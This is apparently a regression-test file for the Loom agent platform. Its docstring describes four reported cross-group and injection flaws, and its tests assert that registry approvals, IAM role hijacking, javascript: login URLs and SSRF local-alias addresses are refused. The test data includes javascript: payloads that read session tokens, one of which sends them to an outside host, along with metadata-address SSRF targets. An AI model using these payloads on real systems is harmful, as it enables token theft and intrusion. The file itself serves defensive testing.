"""Four cross-group findings reported together, and their guards.

Each is the same class as the earlier reports — a caller-supplied key reaching
a resource the caller is not entitled to — on a route that had not been swept:

* **Registry status transitions.** `registry:write` was enough to drive
  another group's agent, MCP server or A2A agent to APPROVED. Approval is both
  the deploy gate and the t-user catalog gate, and the descriptors published to
  the site-wide AWS Agent Registry carry the victim's invoke URL / endpoint.
* **IAM execution-role takeover.** `GET /api/agents/roles` listed every
  AgentCore-trusting role in the AWS account to any `agent:read` holder,
  deploy accepted any ARN, and `_sync_role_policy` then
  PutRolePolicy-replaced `loom-agent-base-policy` on it. The agent was
  group-checked; the role was not. No `security:write` required.
* **`authorization_endpoint` scheme.** OIDC discovery copied the field
  verbatim, Link Account concatenated it into `authorize_url`, and the SPA
  assigned that to `window.location.href` — so a `javascript:` URL ran in
  Loom's origin, where session tokens live in sessionStorage.
* **SSRF guard gaps.** `_is_always_disallowed_ip` never covered 0.0.0.0/8
  beyond `0.0.0.0` itself, nor the IPv6 metadata address, so
  `http://0.0.0.1:<port>/` reached a listener that the same guard refused on
  127.0.0.1.
"""
import ipaddress
import unittest
from unittest.mock import patch

from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.main import app
from app.db import Base, get_db
from app.dependencies.auth import GROUP_SCOPES, UserInfo, get_current_user
from app.models.agent import Agent
from app.models.managed_role import ManagedRole
from app.services.net_guard import _is_always_disallowed_ip
from app.services.oidc import OIDCDiscoveryError, require_https_endpoint


class TestSsrfGuardCoversLocalAliases(unittest.TestCase):
    def test_this_network_block_is_refused(self) -> None:
        """0.0.0.0/8 reaches local listeners on Linux; only 0.0.0.0 itself was
        caught, by is_unspecified."""
        # nosec B104 — these are addresses asserted to be *refused*, not a bind target
        for addr in ("0.0.0.0", "0.0.0.1", "0.1.2.3", "0.255.255.255"):  # nosec B104
            with self.subTest(addr=addr):
                self.assertTrue(_is_always_disallowed_ip(ipaddress.ip_address(addr)))

    def test_ipv4_mapped_form_is_refused(self) -> None:
        self.assertTrue(_is_always_disallowed_ip(ipaddress.ip_address("::ffff:0.0.0.1")))

    def test_ipv6_metadata_address_is_refused(self) -> None:
        """fd00:ec2::254 is a ULA, so it is only is_private — which the
        permissive level deliberately allows."""
        self.assertTrue(_is_always_disallowed_ip(ipaddress.ip_address("fd00:ec2::254")))

    def test_private_addresses_are_still_allowed(self) -> None:
        """The backend runs in private subnets to reach VPC-internal MCP
        servers, so a blanket is_private check would have been the wrong fix."""
        for addr in ("10.0.0.1", "192.168.1.5", "172.16.0.1", "fd00::1"):
            with self.subTest(addr=addr):
                self.assertFalse(_is_always_disallowed_ip(ipaddress.ip_address(addr)))

    def test_public_addresses_are_still_allowed(self) -> None:
        self.assertFalse(_is_always_disallowed_ip(ipaddress.ip_address("8.8.8.8")))


class TestDiscoveryEndpointsMustBeHttps(unittest.TestCase):
    def test_dangerous_schemes_are_refused(self) -> None:
        for value in (
            "javascript:alert(document.title=sessionStorage.loom_auth_tokens)",
            "data:text/html,<script>1</script>",
            "vbscript:x",
            "http://downgraded.example.com/authorize",
            "/relative",
            "",
        ):
            with self.subTest(value=value):
                with self.assertRaises(OIDCDiscoveryError):
                    require_https_endpoint("authorization_endpoint", value)

    def test_https_is_allowed(self) -> None:
        url = "https://login.example.com/oauth2/v2.0/authorize"
        self.assertEqual(url, require_https_endpoint("authorization_endpoint", url))


class _ApiTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.engine = create_engine(
            "sqlite:///:memory:", connect_args={"check_same_thread": False}, poolclass=StaticPool
        )
        Base.metadata.create_all(bind=cls.engine)
        cls.Session = sessionmaker(autocommit=False, autoflush=False, bind=cls.engine)
        cls.all_scopes = sorted({s for v in GROUP_SCOPES.values() for s in v})

    def setUp(self) -> None:
        self.db = self.Session()

        def override_get_db():
            try:
                yield self.db
            finally:
                pass

        app.dependency_overrides[get_db] = override_get_db
        self.client = TestClient(app)

    def tearDown(self) -> None:
        self.db.rollback()
        self.db.close()
        Base.metadata.drop_all(bind=self.engine)
        Base.metadata.create_all(bind=self.engine)
        app.dependency_overrides.clear()

    def _as(self, groups: list[str], all_scopes: bool = True) -> None:
        """All scopes by default, so a 403 can only come from the group rule
        and not from the scope gate."""
        app.dependency_overrides[get_current_user] = lambda: UserInfo(
            sub="attacker", username="attacker@example.com", groups=groups,
            scopes=self.all_scopes if all_scopes else [],
        )


class TestRegistryTransitionsAreGroupChecked(_ApiTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.victim = Agent(
            arn="arn:aws:bedrock-agentcore:us-east-1:123456789012:runtime/victim",
            runtime_id="victim", name="victim_agent", status="READY",
            region="us-east-1", account_id="123456789012", source="deploy",
            registry_record_id="rec-victim", registry_status="DRAFT",
        )
        self.victim.set_tags({"loom:group": "mcp"})
        self.db.add(self.victim)
        self.db.commit()
        self.db.refresh(self.victim)

    def test_cannot_submit_another_groups_resource(self) -> None:
        self._as(["t-admin", "g-admins-demo"])
        self.assertEqual(
            403, self.client.post("/api/registry/records/rec-victim/submit").status_code)

    def test_cannot_approve_another_groups_resource(self) -> None:
        """Approve is the deploy gate and the t-user catalog gate."""
        self._as(["t-admin", "g-admins-demo"])
        resp = self.client.post("/api/registry/records/rec-victim/approve", json={"reason": "x"})
        self.assertEqual(403, resp.status_code)
        self.db.refresh(self.victim)
        self.assertEqual("DRAFT", self.victim.registry_status)

    def test_cannot_reject_another_groups_resource(self) -> None:
        self._as(["t-admin", "g-admins-demo"])
        resp = self.client.post("/api/registry/records/rec-victim/reject", json={"reason": "x"})
        self.assertEqual(403, resp.status_code)

    def test_cannot_delete_another_groups_record(self) -> None:
        self._as(["t-admin", "g-admins-demo"])
        resp = self.client.delete("/api/registry/records/rec-victim")
        self.assertEqual(403, resp.status_code)
        self.db.refresh(self.victim)
        self.assertEqual("rec-victim", self.victim.registry_record_id)


class TestExecutionRoleCannotBeHijacked(_ApiTestCase):
    def setUp(self) -> None:
        super().setUp()
        self.victim_role = ManagedRole(
            role_name="victim-security-exec", role_type="agent",
            role_arn="arn:aws:iam::123456789012:role/victim-security-exec",
        )
        self.victim_role.set_tags({"loom:group": "security"})
        self.own_role = ManagedRole(
            role_name="demo-exec", role_type="agent",
            role_arn="arn:aws:iam::123456789012:role/demo-exec",
        )
        self.own_role.set_tags({"loom:group": "demo"})
        self.db.add_all([self.victim_role, self.own_role])
        self.db.commit()

    def _deploy(self, role_arn: str):
        return self.client.post("/api/agents", json={
            "source": "deploy", "name": "demo_attacker",
            "model_id": "us.anthropic.claude-sonnet-4-6",
            "tags": {"loom:group": "demo"},
            "role_arn": role_arn,
        })

    def test_cannot_attach_another_groups_role(self) -> None:
        self._as(["t-admin", "g-admins-demo"])
        resp = self._deploy(self.victim_role.role_arn)
        self.assertEqual(403, resp.status_code)
        self.assertNotIn("victim-security-exec", resp.text)

    def test_cannot_attach_an_unregistered_account_role(self) -> None:
        """The reported path used a role with no Loom record at all, found via
        the unscoped discovery listing."""
        self._as(["t-admin", "g-admins-demo"])
        resp = self._deploy("arn:aws:iam::123456789012:role/some-other-agentcore-role")
        self.assertEqual(403, resp.status_code)

    def test_own_group_role_is_accepted(self) -> None:
        self._as(["t-admin", "g-admins-demo"])
        self.assertNotEqual(403, self._deploy(self.own_role.role_arn).status_code)

    def test_super_admin_may_attach_any_role(self) -> None:
        self._as(["t-admin", "g-admins-super"])
        self.assertNotEqual(403, self._deploy(self.victim_role.role_arn).status_code)


if __name__ == "__main__":
    unittest.main()


class TestLoginConfigRefusesUnsafeNavigationTargets(_ApiTestCase):
    """`/api/auth/config` must not hand the login page a URL it will navigate to.

    The reported sink was Link Account's `authorize_url`, which needs
    `agent:read`. Fixing it surfaced three more sinks fed by the same
    IdP-derived values, and the worst of them is here: `/api/auth/config` is
    **unauthenticated** and serves `authorization_endpoint` (assigned to
    `window.location.href` to start the login redirect) and `issuer_url`
    (used to build the IdP logout URL). So this sink needs no scope at all.

    `fetch_discovery` rejects a non-https endpoint now, so no newly registered
    provider can carry one. These cover the rows written before that check.
    """

    def _active_idp(self, **overrides):
        from app.models.identity_provider import IdentityProvider

        fields = dict(
            name="corp-idp", provider_type="okta",
            issuer_url="https://corp.okta.com",
            authorization_endpoint="https://corp.okta.com/oauth2/v1/authorize",
            token_endpoint="https://corp.okta.com/oauth2/v1/token",
            client_id="cid", client_type="public", status="active",
        )
        fields.update(overrides)
        idp = IdentityProvider(**fields)
        self.db.add(idp)
        self.db.commit()
        # /api/auth/config opens its own SessionLocal rather than taking the
        # get_db dependency, so the override alone leaves it reading a
        # different database — which is how the three negative tests below
        # first passed without the seeded provider ever being found.
        self._session_patch = patch("app.db.SessionLocal", return_value=self.db)
        self._session_patch.start()
        self.addCleanup(self._session_patch.stop)
        return idp

    def test_javascript_authorization_endpoint_is_not_served(self) -> None:
        self._active_idp(
            authorization_endpoint="javascript:fetch('//x/?'+sessionStorage.loom_auth_tokens)",
        )
        resp = self.client.get("/api/auth/config")
        self.assertEqual(200, resp.status_code)
        self.assertNotIn("javascript:", resp.text)
        # Falls through to the Cognito default rather than 500ing the endpoint
        # the whole UI boots from.
        self.assertNotEqual("okta", resp.json().get("provider_type"))

    def test_javascript_issuer_url_is_not_served(self) -> None:
        """issuer_url becomes the logout navigation target."""
        self._active_idp(issuer_url="javascript:alert(1)")
        resp = self.client.get("/api/auth/config")
        self.assertNotIn("javascript:", resp.text)
        self.assertNotEqual("okta", resp.json().get("provider_type"))

    def test_plain_http_endpoint_is_not_served(self) -> None:
        self._active_idp(authorization_endpoint="http://corp.okta.com/oauth2/v1/authorize")
        resp = self.client.get("/api/auth/config")
        self.assertNotIn("http://corp.okta.com", resp.text)

    def test_a_valid_https_provider_is_served_normally(self) -> None:
        """Positive control: the guard must not break external login."""
        self._active_idp()
        resp = self.client.get("/api/auth/config")
        self.assertEqual(200, resp.status_code)
        body = resp.json()
        self.assertEqual("okta", body["provider_type"])
        self.assertEqual("https://corp.okta.com/oauth2/v1/authorize", body["authorization_endpoint"])
